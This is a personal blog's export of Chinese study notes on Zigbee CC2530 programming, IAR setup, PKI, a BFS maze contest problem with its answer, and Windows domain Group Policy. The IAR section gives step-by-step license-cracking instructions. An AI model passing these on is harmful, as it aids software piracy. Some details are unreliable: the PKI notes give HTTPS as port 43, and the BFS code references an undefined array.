上拉|下拉 或 三态。 P2INP 的高三位：控制三组引脚的 上拉或下拉 跳线帽 就是开发板上，连接了两个相邻排针的导体，类似给排针戴了顶帽子，所以叫做跳线帽。 zigbee 模块上，cc2580的 P0_6排针 与 GND排针 之间就有一个跳线帽。 zigbee 模块上，LED8 与 GND 之间也有一个跳线帽。 zigbee 常用引脚的位宏定义。 比如其中一个 P0_2 表示的就是 P0 组引脚中的 第三个引脚。 而单片机中，如果需要对寄存器位进行赋值操作，需要先声明一个位变量sbit P0_2 = P0^2 代码123456789101112131415161718192021222324252627#include &lt;iocc2530.h&gt;void delay(int x);void main()&#123; // 设置 P0_6 输入，确定 跳线帽的状态 P0SEL &amp;= 0xbe; // 设置 P0_6 , P0_0 为 i/o 口 1011 1110 P0DIR &amp;= 0xbf; // 设置 P0_6 输入 1011 1111 P0DIR |= 0x01; // 设置 P0_0 输出 0000 0001 P0INP &amp;= 0xbf; // 设置 P0_6 组引脚为 上/下拉 1011 1111 P2INP &amp;= 0xdf; // 110 11111 设置 P0 组引脚为上拉 while(1)&#123; //跳线帽插上，灯亮。跳线帽拔掉，灯灭。 if( P0_6 == 0) &#123; P0_0 = 1; &#125;else&#123; P0_0 = 0; &#125; &#125;&#125;void delay(int x)&#123; int i, j; for(i = 0; i &lt; 300; i++) for(j = 0; j &lt; x; j++);&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"zigbee环境搭建","date":"2020-09-10T12:46:25.000Z","path":"2020/09/10/2020.09.10 搭建开发环境编写及仿真/","text":"软件安装，程序编写运行，烧录IAR安装 12345678910111213141. IAR程序下载: 1) 不要从脚本之家之类的网站下载软件。否则，你的浏览器会被恶意串改主页。并且，电脑上会被恶意下载软件。 2) 从官网下载最新版的 IAR for 8051 就行了。 2. IAR程序破解: 教程：&quot; https://blog.csdn.net/qq_38351824/article/details/85005672 &quot; 1) 从可靠途径获得破解软件。 2) 运行破解软件，选择所需要破解的版本。生成密钥 3) 将密钥复制到 IAR程序密钥验证 步骤中，注意断网。 4) IAR 会在生成一个文本，给它放在桌面。 5) 将该文本路径填写到 破解软件 第二栏中，生成另外一个破解 文本。 6) 将破解文本填写到 IAR程序 注册所需文件中，然后一直下一步就行了。 # 注意，最后提取库文件的时候会失败，因为 IAR库文件 是需要另外一套 password 的。 # 但是也不需要担心，我们一般用不到库文件，或者即使要用，也是后期手动下载导入。 使用 新建工程： project -&gt; new project 选择新建一个 8051 的空白文件。 同时新建一个文件夹 lesson1 用来存储所有的工程文件。 工程名取名为 lessonp == lesson project 新建一个空白文件，取名为 lesson.c 用来存储程序文件。 右击工程，add -&gt; add lesson.c 导入源文件到工程。。 写个主函数，然后运行，弹出一个 工作区保存路径，填写 lessonw == lesson workspace 程序编写 1234567891011121314151617181920212223242526272829303132333435361. 头文件 #include &lt;iocc2530.h&gt;2. 配置工程文件: 1) 右击工程 -&gt; 修改常用选项中的 Device 驱动，找到在安装目录下 texas Instruments 中找到相应的 cpu cc2530F256。 2) 选择 linker -&gt; Output 勾选 Override default 和 Allow C-SPY-specific extra output file # 程序可以进行在线烧录，仿真。 3) 选择 Debugger 调试， 驱动器修改虚拟软件仿真 为 &#x27;Texas Instruments&#x27; 真正的硬件仿真器。 3. 安装仿真器(Texas Instruments)驱动。驱动所在路径：&quot; C:\\Program Files (x86)\\IAR Systems\\Embedded Workbench 8.1\\8051\\drivers\\Texas Instruments &quot;4. 仿真器上有两个红灯，其中一个是供电灯，另外一个是是否识别到 zigbee 芯片模块灯: 1) 当能够识别到硬件的时候，其中一个灯不亮。表示正常，可以进行下载程序。 2) 否则，如果两个灯都亮，就需要进行按键复位一下，重新识别硬件。5. IAR 中，先编译 --&gt; 再下载烧录程序。6. 调试: 1) 烧录程序后，直接进入程序执行状态。 2) 点击暂停按钮，可以进入 debug 状态。 3) 曲线图标：逐行运行 4) 向内∟图标: 逐行调试，遇到函数进入。 向外∟图标: 跳出当前所在函数。 5) 小三角加条竖线: 跳转到下一个标记节点。 7. 生成 hex 文件: 1) option -&gt; linker -&gt; extra Output 2) 勾选生成 Overide default文件名取名为 &#x27;lesson1.hex&#x27;。 3) 选择 OutPut fomat 格式为 &#x27;intel-extended&#x27;8. hex 文件作用: 1) 一种 16 进制程序文件，相当于源代码，但是可以不用再结果 IAR 编译器编译。 2) 可以直接使用烧录软件，烧录到 zigbee开发板 中。 3) flash Programmer 下载地址:&quot; https://www.ti.com/licreg/docs/swlicresults.tsp?countryName=China+%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29&amp;eeq=Civil&amp;Certify=YES&amp;submitsubmit=Submit &quot; 4) 自动获取仿真驱动软件，选择好 hex 文件，点击开始烧录就行了！！ 相关经验 带排线的那个 zigbee 模块 ———— 是仿真用到。 最小的那个模块 ———— 抓取无线数据包的硬件工具 dongle 代码12345678910111213141516171819202122#include &lt;iocc2530.h&gt;void delay(int x)&#123; int i, j; for(i = 0; i &lt; 300; i++) for(j = 0; j &lt; x; j++);&#125;// P0组 低四位输出 各自连接一个led灯, 形成流水灯。P0SEL &amp;= 0xf0; // 最后四个引脚设置为 I/OP0DIR |= 0x0f; // 最后四个引脚进行输出int v = 0x01;while(1)&#123; P0 = v; delay(1000); P0 = 0x00; delay(1000); v = v &lt;&lt; 1; if(v == 0x10) v = 0x01;&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"zigbee概述","date":"2020-09-09T09:00:00.000Z","path":"2020/09/09/2020.09.09 zigbee 概述/","text":"zigbee组成12345678910111213141516171819202122232425262728293031321. zigbee 不像 51单片机 只需要理解里面的寄存器就可以玩转: 1) zigbee 最主要的是协议栈。它包含了很多的协议站，以及相关代码。这是最难的。 2) 资料方面，互联网上关于 zigbee 相关的深入浅出的资料很少。特别是关于讲解&#x27;协议栈&#x27;这一方面。2. 术语: 1) zigbee, zigbee通信方式，zigbee协议 三者都是一个意思。 2) 节点，无线模块，无线设备，三者都是一个意思。3. 计算机之间，局域网采用以太网协议: 1) zigbee之间通信，同样的，采用zigbee协议 2) 作用：&#x27;构建无线局域网！！&#x27;4. 如果一个无线局域网用于传感器的数据收集和监控，那么这个网络就叫做&#x27;无线传感器网络&#x27; 1) 也就是说，无线传感器网络是无线局域网的一个具体应用。5. 已经有了 蓝牙 和 wifi 为什么还要用 zigbee: 1) 蓝牙：功耗低，但是组件网络的节点数少 7~8个。 2) wifi：通信功率 比较大， 功耗大。 3) zigbee：可以组将大概模网络，节点可以上万个！功耗低(cc 2530 正常工作电流8mA, 最低工作达到几个uA)。 缺点：通信速率比较小，250 kbs。比较适合传感器的信息传送。6. 应用方面: 1) 家具方面：可以用电池，或者太阳能供电。 2) 工业方面：传统使用总线组将局域网，如果有zigbee的话，就可以无线组网。 3) 农业方面：组将无线传感器网络，温湿度传感器，二氧化碳浓度等传感器的数据组网收集。 4) 医疗方面：...... 5) 物联网时代，zigbee 使用十分频繁。7. zigbee 模块一般配合上位机构建控制系统: 1) 上位机可以是 pc，也可以是通过互联网的远程服务器。 2) 上位机可以实现对 zigbee 系统中的元件控制。 3) 主 zigbee 与 计算机之间 是&#x27;采用串口进行通信&#x27;的。也就是和 arduino 串口通信一样，需要使用一根数据线连接电脑。计算机获取数据。 zigbee组网组成12345678910111213141516171819202122232425262728291. 局域网内主要有三种成员: 1) 自顶向下：调节器，路由器，终端。三者都是使用zigbee模块来组成的。 2) 上位机主要是与主zigbee进行数据交互通信。 3) 远程服务器，是为了外出也能控制家里的物联网设备。2. 以太网协议通信条件: 1) 硬件：网卡 2) 软件：以太网协议栈（一堆程序代码？？？）3. zigbee 协议通信条件: 1) 软件上：zigbee协议栈（一堆程序代码） 2) 硬件上：&#x27;一种支持zigbee底层协议的芯片&#x27;。4. 几种关键字的含义: 1) zigbee联盟：ambare/飞思卡尔... 制定zigbee协议的一个协会组织，再美国的TI公司。 zigbee厂商，主要把zigbee协议用于推广和实际应用。 2) zstack TI：zigbee软件上&#x27;支持的协议栈&#x27;，由 TI 公司开发，并不是 zigbee 本身的底层协议. 3) cc2530：就是 TI 公司推出的&#x27;其中一&#x27;种&#x27;支持 zigbee 底层协议&#x27;的 &#x27;硬件芯片&#x27;。 4) IAR：编程软件，编译程序，下载烧录程序到 zigbee 开发板。5. cc2530芯片：cc2530F256 TI 50j.. # zigbee芯片上那块小的板子，中间的黑色正方形就是cc2530 1) F 标识flash，存储程序的rom 256kb 最大的一款。 2) 所有的种类芯片，ram 只有8K。 3) 50j：表示的是产品信息。6. 学习方法: 1) 记录学习笔记，做实验，抓包 2) 1~6 节可以按照顺序看，第七部分上半部分协议栈的使用学习完，可以直接先看第八部分 zigbee无线网络通信。熟悉这两部分之后，在学习 OSAL 以及对比学习其他通信方式。 3) 所有内容可以先粗看一遍，所有例子烧录进去观察现象，再来细看学习。 相关经验 手机是不能直接和 zigbee 进行数据通信的。 计算机的作用就是，将 zigbee 网络 与 互联网广域网 进行连接的中间。 国内用的一般都是 TI 公司的协议栈，以及硬件芯片cc2530。免费，稳定，可靠。","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"Hello world","date":"2020-09-03T09:42:39.545Z","path":"2020/09/03/hexo 默认文章/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"","tags":[{"name":"个人博客搭建","slug":"个人博客搭建","permalink":"http://www.fangning.xyz.com/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"PKI","date":"2020-08-24T14:33:30.000Z","path":"2020/08/24/2020.08.24 PKI/","text":"PKI什么是 PKI 1234567891011121314151. Public Key Infrastructure：公钥基础设施 1) 作用：通过加密技术 和 数字签名 保证信息的安全。例如：互联网中数据传输过程中进行加密、 2) 组成：&#x27;公钥加密技术、数字证书、CA&#x27;、RA......2. 信息安全三要素: 1) &#x27;机密性&#x27;：别人拿到数据，但是看不懂，破不开。 2) &#x27;完整性&#x27;：要防止接受到的数据不能被是被中间人破坏，篡改的。如果被破坏了，接收方不能获取，需要重新发送。 3) &#x27;身份验证/操作的不可否认性&#x27;：检查接收方获得的数据是否是由发送方发出的。防止数据被伪造发送，就像伪 DHCP 服务器发送 Offer 包，导致客户机获取网络配置失败。 # 这些三种技术，都包含在 PKI 技术范畴。无论那种加密技术，都有包含 PKI 技术。 3. 应用领域: 1) SSL/HTTPS ：网页信息技术。（https = http ssl） 2) IPsecVPN：很多网络公司用到的 vpn。 3) 以及部分远程访问 VPN。 公钥加密技术1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253541. 作用：实现对信息加密、数字签名等安全保障。3. 加密算法：将原文数据 --------&gt; 通过加密算法 ----------&gt; 生成密文 1) 密钥：加密/破解加密 所用到的关键字、字符串。 2) x + 5 = y：其中x 为原文，y 为密文， &#x27;5 则是密钥&#x27;。 4. 加密算法分类: ------------# 保障了数据传输的 机密性 1) 对称加密算法： DES\\3DES\\AES高级加密算法 &#x27;加解密的密钥一致！&#x27;，只需要一个密钥。 密钥容易丢失，所以会导致算法不安全。 密钥通常会有成百上千字节的字符串。 密钥不是通过数据传输发送，而是&#x27;提前数据收发双方协商得到的&#x27;。 2) 非对称加密算法： RSA\\DH *通信需要双方各自产生一对公私钥. *双方各自交换公钥，以 明文 形式传输。 *公钥私钥互为加解密关系。用公钥加密的数据，必须用私钥才能解密 &lt;=&gt; 用私钥加密的数据，也只能用公钥才能解密。 # 公钥+非对称加密算法+原文 = 密文 # 密文+私钥+加密算法 = 原文 &#x27;因此，如果想要 破解非对称加密过的数据 只能使用接收方私自拥有的 私钥&#x27;。 3) Hash算法： MD5\\SHA-数字 * hash 算法不可逆。 * -数字：中数字表示生成的 hash值 的长度。 * &#x27;主要作用&#x27;：验证数据完整性。 * 用 hash 算法加密的数据，称作 &#x27;摘要&#x27;。5. 数字签名：自己的私钥加密的数据，确定了该数据出处唯一性，见该数据如见人 * 使用私钥加密，只有用自己的公钥才能解开。 * 如果用公钥解开了该数据，表示这个数据一定是我发送出来的。 * 因为私钥，只有发送方有，不泄露，保密。6. 使用加密算法对数据进行加密后，&#x27;数据大小并不会发生改变&#x27;。7. 证书: 1) 作用: * 非对称加密计算传输数据过程中，需要收发双方得到对方的 公钥。 * 如何确保，你所得到的公钥，就一定是对方所发送的呢？也就是&#x27;如何确认 公钥的不可否认性?&#x27; * 这时，需要一个双方都信任的官方机构，颁发 &#x27;证书&#x27; 来证明。 2) 证书颁发与实现: * 数据发送方，到 CA(证书颁发机构) 注册一个 &#x27;数字证书&#x27;。 * CA 官方自己拥有 公钥 和 私钥。 * CA 将 &#x27;数据发送方的标识信息、公钥&#x27; 以及 &#x27;自己的标识信息、数字签名&#x27; 集成到一个证书上颁发给数据发送方。 * 数据发送方将证书发送给接收方，接收方使用 CA机构公钥 对证书中的数字签名进行解密、得到发送方的公钥。 * 这样通过双方都信任的第三方 CA 机构的证明，保证了数据的不可否认性。 3) 证书用于保证公密的合法性。 4) 证书格式遵循 X.509 标准。 5) 数字证书包含信息: * 使用者的公钥值 * 使用者标识信息（名称、电子邮箱地址、ip地址......） * 有效期（证书有效时间） * 颁发者标识信息 * 颁发者的数字签名 6) 数字证书由权威公正的第三方机构 CA 签发。 非对称加密技术传输数据过程 机密性：发送方使用 RSA+对方公钥 对数据进行加密，接收方使用自己的私钥才能解密。 不可否认性：发送方需要在数据包后面，添加一个数据摘要的数字签名，只有使用自己的私钥才能生成该数字签名。 完整性：发送方对加密后的数据进行 hash 加密，接受方得到数据后，对验证 hash 值的准确性。 公钥的合法性：发送方发送权威证书给接受方，接收方使用 CA官方 公钥对证书进行解密验证。确保了发送方公钥的合法性。 实验 部署 https / ssl 服务器。 http 使用的是 80 端口。通信过程无加密。 https 使用的是 43 端口。需要设置 CA 官方证书颁发机构。通信过程使用 公钥加密技术。 自己搭建一个 CA 证书颁发机构。(虚拟自用） 相关经验 RSA 目前其中一种比较常见的非对称加密算法————公开的算法 课外拓展 无","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"BFS广度搜索","date":"2020-08-22T09:14:30.000Z","path":"2020/08/22/2020.08.22 BFS广度优先遍历/","text":"BFS 广度优先遍历经验12345678910111213141516171819202122232425262728293031321. 不同于 深度优先遍历dfs ———— 递归式遍历(所问即所答)。 1) 广度优先遍历采用的是 迭代遍历的方式，非递归只有循环. 2. 该算法主要思想是: 1) 从&#x27;最开始&#x27;的&#x27;第一个节点&#x27;，按照一种固定的规律，&#x27;遍历出&#x27;与之&#x27;相邻的节点&#x27;。 2) 采用的存储数据结构是 ———— &#x27;队列&#x27;。有时根据题目需求和效率需求，会采用 c++ stl容器 ———— &#x27;优先队列&#x27;( Priority queue )。 3) &#x27;手动添加第一个&#x27;结点到队列，然后进入循环体，&#x27;直到队列为空&#x27;或&#x27;找到目标&#x27;结束遍历。遍历的同时，&#x27;会向&#x27;队列中&#x27;添加新的节点&#x27;，&#x27;删除已经遍历过的节点&#x27;。3. 结构体队列: 1) 大多数情况下，我们采用的对象并不是简单的级别数据类型。需要我们&#x27;自己设定抽象数据类型&#x27;。 2) 比如跑图的时候，需要记录 &#x27;步数step、坐标xy、路径string&#x27;。这些记录每走一步，都需要记录下来，所以定义一个结构体，然后&#x27;采用结构体队列&#x27;来存储遍历时的&#x27;中间结果&#x27;。 4. 结构体声明: struct node&#123; int x, y; node( int x1, int y1 )&#123; x = x1; y = y1; &#125; &#125; 构造方法的使用: node t( 1, 1); # 声明了一个结构体变量，初始化成员 x = 1, y = 1 5. 队列的操作: queue&lt;node&gt; q; # 定义一个结构体队列 q.push( node t ); # 添加一个节点到队列 q.pop( node t ); # 从队列删除一个节点 q.front(); # 读出队列一个节点 q.empty(); # 判断队列是否为空 true/false q.size(); # 读取队列中元素个数 例题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859601. 原题路径: &quot; D:\\Workspace-acm\\WinterVacationSelf-Study\\蓝桥杯历届试题\\省赛\\第十届蓝桥杯大赛个人赛省赛（软件类）真题 &quot; 2. 代码路径: &quot; D:\\Workspace-acm\\WinterVacationSelf-Study\\LanQiaoTenB.E &quot; 3. 题目: 【问题描述】 下图给出了一个迷宫的平面图，其中标记为 1 的为障碍，标记为 0 的为可 以通行的地方。010000000100001001110000 迷宫的入口为左上角，出口为右下角，在迷宫中，只能从一个位置走到这 个它的上、下、左、右四个方向之一。 对于上面的迷宫，从入口开始，可以按DRRURRDDDR 的顺序通过迷宫，一共 10 步。其中 D、U、L、R 分别表示向下、向上、向左、向右走。 对于下面这个更复杂的迷宫（30 行 50 列），请找出一种通过迷宫的方式， 其使用的步数最少，在步数最少的前提下，请找出字典序最小的一个作为答案。 请注意在字典序中D&lt;L&lt;R&lt;U。（如果你把以下文字复制到文本文件中，请务必检查复制的内容是否与文档中的一致。在试题目录下有一个文件 maze.txt，内容与下面的文本相同）010101010010110010010101100101101001000010001010100000100010000010101001000010000000100110011010010101111011010010001000001101001011100011000000010000010000000010101000110100001010000010101010110010110001111100000010100001001010001010000010110000000011001000110101000010101100011010011010101011110111000110110101010010010010100000010001010011100000001010000010100010011010101011111001100001000011101000111000001010100001100010000001000101001100001001110001101000011100100010010101010101010100011010000001000010010000010100101010111010001010101000010111100100101001001000010000010101010100100100010100000000100000001010110011110100011000001010101000111010101001110000100001100001011001111011010000100010101010100001101010100101000010100000111011101001100000001011000100001011001011010010111000000001001010100100000001010010000100010000010001111010100100101001010101101001010100011010101101110000110101110010100001000011000000101001010000010001110000100000100011000011010110100000010010100100100001110110100101000101000000001110110010110101101010100001001010000100001101010100001000100010010001000101011010000100011001000100001010100101010101111101001000000100101000000110010100101001000001000000000010110100000010011101110010010000111010010110111010000000011010001000100010000000100001110100000011001110101000101000100010001111100010101001010000001000100000101001010010101100000001001010100010111010000011110000100001000000011011100000000100000000101110000001100111010111010001000110111010101101111000【答案提交】 这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一 个字符串，包含四种字母 D、U、L、R，在提交答案时只填写这个字符串，填写多余的内容将无法得分。 答案：DDDDRRURRRRRRDRRRRDDDLDDRDDDDDDDDDDDDRDDRRRURRUURRDDDDRDRRRRRRDRRURRDDDRRRRUURUUUUUUULULLUUUURRRRUULLLUUUULLUUULUURRURRURURRRDDRRRRRDDRRDDLLLDDRRDDRDDLDDDLLDDLLLDLDDDLDDRRRRRRRRRDDDDDDRR 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;string&gt;using namespace std;const int H = 33, L = 53;const int N = H*L;char a[H][L];bool vis[H][L];int dir1[4][2] = &#123; &#123;1 , 0&#125;, &#123;0 , -1&#125;, &#123;0 , 1&#125;, &#123;-1 , 0&#125; &#125;;struct note&#123; int x, y; //坐标 char ans[N]; //字符串答案,表示搜索过的路径 int step; //步数 note(int a, int b, int s)&#123; x = a; y = b; step = s; &#125;&#125;;void bfs(void)&#123; queue&lt;note&gt; q; note t(1 , 1, 0); t.ans[t.step] = &#x27;\\0&#x27;; q.push(t); vis[1][1] = true; a[1][1] = &#x27;*&#x27;; while(!q.empty()) &#123; //取出队列的第一个元素 note tt = q.front(); q.pop(); //判断是否满足搜索条件 if(tt.x == 30 &amp;&amp; tt.y == 50) &#123; tt.ans[tt.step] = &#x27;\\0&#x27;; printf(&quot;\\n%d\\n%s\\n&quot;, tt.step, tt.ans); //putpath(tt.ans); //break; &#125; //不满足条件时，搜索其他位置，并且加入队列 for( int i = 0; i &lt; 4; i++ ) &#123; int x = tt.x + dir1[i][0]; int y = tt.y + dir1[i][1]; if(x &gt;= 1 &amp;&amp; y &gt;= 1 &amp;&amp; x &lt;= 30 &amp;&amp; y &lt;= 50) &#123; if(!vis[x][y] &amp;&amp; a[x][y] == &#x27;0&#x27;) &#123; note t3(x, y, tt.step + 1); for(int j = 0; j &lt; tt.step; j++) t3.ans[j] = tt.ans[j]; t3.ans[t3.step - 1] = dir2[i]; q.push(t3); vis[x][y] = true; &#125; &#125; &#125; &#125;&#125;int main()&#123; for(int i = 1; i &lt;= 30; i++)&#123; for(int j = 1; j &lt;= 50; j++)&#123; scanf(&quot;%c&quot;, &amp;a[i][j]); &#125; getchar(); &#125; bfs(); return 0;&#125;/**1. 步数最少。2. 字典序列最小3. DLRU下左右上4. 输出字符串// 打印路径代码void putpath(char ans[N])&#123; int x = 1, y = 1; a[x][y] = &#x27;*&#x27;; for(int i = 0; ans[i] != &#x27;\\0&#x27;; i++)&#123; switch (ans[i]) &#123; case &#x27;D&#x27;: x += dir1[0][0]; y += dir1[0][1]; break; case &#x27;L&#x27;: x += dir1[1][0]; y += dir1[1][1]; break; case &#x27;R&#x27;: x += dir1[2][0]; y += dir1[2][1]; break; case &#x27;U&#x27;: x += dir1[3][0]; y += dir1[3][1]; break; &#125; if(a[x][y] == &#x27;0&#x27;) a[x][y] = &#x27;*&#x27;; else a[x][y] = &#x27;&amp;&#x27;; &#125; for(int i = 1; i &lt;= 30; i++)&#123; for(int j = 1; j &lt;= 50; j++) putchar(a[i][j]); putchar(&#x27;\\n&#x27;); &#125;&#125;**/","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"域3","date":"2020-08-20T11:33:30.000Z","path":"2020/08/20/2020.08.20 域3/","text":"域3将域用户获得成员机的完全控制权限123456781. 新建的域用户虽然可以登陆任何的计算机，但是&#x27;没有本地计算机的完全控制权限&#x27;。2. 如果需要让某个域用户获得某台计算机的完全控制权限。 1) 需要将该用户&#x27;加入&#x27;本地计算机的 &#x27;administrators 组&#x27;当中，而不是加入 域管理员组Domain admins。 2) 方法就是，先用 &#x27;域管理员账&#x27;号 登陆 &#x27;该计算&#x27;机，然后将 &#x27;普通域用户&#x27; 添加到 &#x27;本地管理员组&#x27;。 3) 这样，该&#x27;普通域用户&#x27;就&#x27;获得&#x27;了&#x27;该本地计算机&#x27;的&#x27;完全控制权限&#x27;。3. 所有的 Domain admins 用户都属于该域下所有计算机的 Administrators。可想而知，&#x27;域管理员的权限非常之大&#x27;，是&#x27;所有计算机的管理员&#x27;。 前提知识1234567891011121314151617181920212223242526272829301. OU：organization unit 组织单位 1) 作用：用于归类域资源（users , computer , domain controller）。 2) 组的出现是为了方便赋予权限；组织单位的出现则是为了方便&#x27;下发组策略&#x27;。 3) 实验：1. AD 用户和计算机中，整个域 xiaoqiao.com 就是一个最大的 OU 容器。 2. 右键新建 -&gt; 组织单位 -&gt; 起一个部门或者企业的分类。 OU 的作用就是给成员机分类。系统自带DC组单位. 3. 新建完成后，&#x27;文件夹图标带有一个小 logo&#x27; 的才是&#x27;真正&#x27;的 &#x27;organization unit&#x27; ，&#x27;才可以下达组策略&#x27;. 4. 可以将任何 &#x27;域用户/组 和 计算机pc&#x27; 移动到新建的 OU文件夹中。整个公司人员分类称作&#x27;组织架构&#x27;。组策略作用对象可以是用户，或者计算机。 2. GPO = Group Policy：组策略. 1) 作用：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等. 2) 组策略在域中，是&#x27;基于 OU 来下发&#x27;. 域组策略&#x27;优先级&#x27; &gt; &#x27;本地组策略&#x27; 3) 管理工具里面可以打开组策略工具。对 OU 进行新建组策略，查看和修改组策略。一般情况下，&#x27;组策略命名与OU文件夹名一致&#x27;。 4) 组策下发（此处以修改成员机桌面壁纸为例）: (1) 右击需要下发组策略的 OU。新建组策略，命名为该 OU 的名称。 (2) 右击新建立好的组策略，编辑。 (3) 可以对 OU 中的 PU 进行下发，或者对 OU 中的用户进行下发。 下发之前，一般将新建的 域用户 和 成员机 分别移动到 组织架构 对应的 OU 中。 (4) 从 用户策略，管理模板，桌面，壁纸 中启用该策略。 用户修改壁纸时，需要找到目标壁纸，一般采用 文件共享 192.168.190.132\\\\share\\a.jpg（也可使用ftp://192.168.190.132/share/a.jpg）。因此，需要提前准备好共享文件夹，以及桌面壁纸(.jpg格式) (5) 组策略在域中下发后，用户的应用顺序应该是：&#x27;LSDOU&#x27;。L 表示本地，S 暂时未接触，D 域策略，&#x27;OU组策略&#x27; (6) 对于矛盾的策略，&#x27;最后应用的策略为最终结果&#x27;；对于OU组策略，用户先从 上级OU 策略开始应用，最后到最接近该用户所在位置的 下级OU 策略。因此，如果上下级OU 策略矛盾，&#x27;最后生效的是 下级OU 策略&#x27;。 ****正常情况下：LSDOU顺序 上级OU： 桌面：aa 运行：删除 下级OU： 桌面：未配置 运行：不删除 下级OU用户结果：桌面：aa 运行：不删除 组策略的一些设置1234567891011121314151. 查看修改过的组策略条目: 1) 选中策略。 2) 等级设置复选框。 3) 弹出警告，点击添加、确定。 4) 然后就可以看到修改过的 &#x27;计算机配置&#x27; 以及 &#x27;用户配置&#x27; 的&#x27;详细信息&#x27;。 2. 策略的&#x27;强制&#x27;功能: 1) 有的时候，许多 下级OU 组策略会覆盖 上级OU 的策略。如果在未来一小段时间内，又需要让所有用户启用 上级OU 组策略。那就很麻烦了，需要将下级与之冲突的策略全部停用，这样修改很麻烦，而且改完如果哪一天再改回来，简直要命。所以就出现了一个很方便的功能 ———— &#x27;策略强制&#x27; 2) 右击策略，点击强制。此时，该策略成为域用户&#x27;最后应用的策略&#x27;，后面的下级OU 不再应用。 3. OU的&#x27;组织继承&#x27;功能: 1) 域用户应用组策略时，&#x27;直接跳过上级OU&#x27;设置&#x27;的组策略&#x27;，&#x27;只应用&#x27;该 OU&#x27;自身所设置的组策略&#x27;。 2) 右击OU，点击阻止继承。类似于文件夹访问控制列表阻止继承一样。 3) 如果 上级OU策略 &#x27;开启了强&#x27;制， 下级OU &#x27;开启了阻止继承&#x27;。最终结果，还是遵循 上级OU 的强制，&#x27;阻止继承失效&#x27;。 常用策略12345678910111213141516171819201. 开/关机脚本：计算机配置 -&gt; 策略 -&gt; Windows 设置 -&gt; 脚本 1) 只要计算机一开机/关机，就会运行该脚本。 2) 不需要用户登陆，因为该策略时针对用户机的。2. 登陆/注销脚本：用户配置 -&gt; 策略 -&gt; Windows 设置 -&gt; 脚本 1) 只要用户一登陆/注销，就会运行指定脚本。3. ctrl+alt+del 组合键登陆用户：Windows 设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项 -&gt; 交互式登陆 1) 启用&#x27;无需按 Ctrl+Alt+Del 键登陆用户&#x27;策略。4. 密码策略 强制密码满足3/4原则的复杂性：windows 设置 -&gt; 安全设置 -&gt; 密码策略 -&gt; 密码复杂性要求 1) 这里有所有有关密码设置的策略。 2) 强制密码历史: 新改的密码不能是以前用过的密码。 3) 用可还原的方式来存储密码: 就是将原来不可逆的加密方式，变成可逆，一般不适使用。 5. 账户锁定阈值：安全设置 -&gt; 账户安全 -&gt; 账户锁定 1) 账户锁定阈值：输入&#x27;密码错误 n 次&#x27;后&#x27;锁定该账户&#x27;，不能登陆。 2) 账户锁定时间：账户被锁&#x27; n 分钟后解锁&#x27;。也可跳过&#x27;域管理员身份&#x27;，在域控中&#x27;修改域用户属性&#x27;来人为解锁。 3) 重置账户锁定计数器：用户输入密码错误次数在 n 分钟之内计数为有效错误。&#x27;如果两次错误输入相隔超过改时间，那么不累加&#x27;。 域的综合应用1234567891011121314151617181920212223242526271. 文件共享 与 ftp + 域 = 无需创建账户 / 无需登陆密码 连接 1) 配置固定 ip 地址，将域名解析指向 域控。 2) 将 文件共享服务器 取一个比较容易辨别的计算机名. 3) 将服务器加入域。 4) 创建 文件共享 以及 ftp 服务。然后，将 Domain Users 用户组，加入到服务的访问控制列表。 # 此时，客户机，无需知道 服务器的ip地址 ，服务器也 不用提供连接账户 给客户。直接就可以使 域用户 连接服务器。 5) 测试：\\\\share.xiaoqiao.com\\share 回车即可。 ftp://share.xiaoqiao.com/ 回车即可。 # 其中 share.xiaoqiao.com 主机名可替代 ip 地址。 2. 域对其他相关服务的优化: 1) &#x27;web服务&#x27;：将web页面发部为非匿名访问，只对 域用户 开发。可以免登陆。 2) &#x27;DHCP服务&#x27;。3. 原理: 1) LDAP：Light Directory Access Protocol ———— 轻量级目录访问协议 2) 凡是想要和 域控中的活动目录 &#x27;做接轨。就必须要具备 LDAP协议&#x27;。 3) windows系统是自带该协议的。 有些 wifi 路由器嵌入 ldap 协议的话，连接的时候不是输入 wifi 密码，而是输入 域用户账户。4. 组管理: 1) 活动目录里面新建组的时候。 2) 如果要给某 OU 赋权限，必须在 OU 里面建立一个组。 只有组才能赋予权限。 3) 组作用域: * 全局 ———— 该域中的组，&#x27;可以被 该林中的其他域 赋予权限&#x27;。 # 一般选择全局 * 通用 ———— 一旦该林中其他域，给该域中的通用组赋权限，那么&#x27;会在其他域中自动生成该组&#x27;。 * 本地域 ———— &#x27;只在&#x27;本地域起作用。 相关经验 因为策略条目有很多，如果需要下发策略，但是找不到在哪，或者不知道是不是存在。可以百度。 域控机不能重启关机什么的，如果必须重启的话，也只能够在晚上。 最后做综合实验的时候搞 FTP 服务弄了很久，最后发现！！！ 做 FTP 